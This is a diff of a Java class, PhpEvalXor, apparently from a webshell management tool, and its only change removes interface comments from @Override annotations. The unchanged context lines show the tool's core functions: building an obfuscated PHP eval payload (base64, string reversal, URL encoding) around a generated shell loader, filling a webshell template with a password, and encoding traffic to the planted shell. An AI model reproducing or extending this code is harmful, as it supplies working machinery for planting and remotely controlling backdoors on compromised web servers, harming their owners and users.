@@ -20,7 +20,7 @@ public class PhpEvalXor implements Cryption {
     private ShellEntity shell;
     private boolean state;
 
-    @Override // core.imp.Cryption
+    @Override 
     public void init(ShellEntity context) {
         this.shell = context;
         this.http = this.shell.getHttp();
@@ -43,7 +43,7 @@ public class PhpEvalXor implements Cryption {
         }
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public byte[] encode(byte[] data) {
         try {
             return E(data);
@@ -53,7 +53,7 @@ public class PhpEvalXor implements Cryption {
         }
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public byte[] decode(byte[] data) {
         if (data == null || data.length <= 0) {
             return data;
@@ -66,7 +66,7 @@ public class PhpEvalXor implements Cryption {
         }
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public boolean isSendRLData() {
         return true;
     }
@@ -92,7 +92,7 @@ public class PhpEvalXor implements Cryption {
         return functions.subMiddleStr(new String(respResult), this.findStrLeft, this.findStrRight);
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public boolean check() {
         return this.state;
     }
@@ -101,7 +101,7 @@ public class PhpEvalXor implements Cryption {
         return URLEncoder.encode(String.format("eval(base64_decode(strrev(urldecode('%s'))));", URLEncoder.encode(new StringBuffer(functions.base64Encode(new String(Generate.GenerateShellLoder(this.shell.getSecretKey(), functions.md5(this.shell.getSecretKey()).substring(0, 16), false)).replace("<?php", "").getBytes())).reverse().toString())));
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public byte[] generate(String password, String secretKey) {
         return new String(functions.readInputStreamAutoClose(PhpEvalXor.class.getResourceAsStream("template/eval.bin"))).replace("{pass}", password).getBytes();
     }
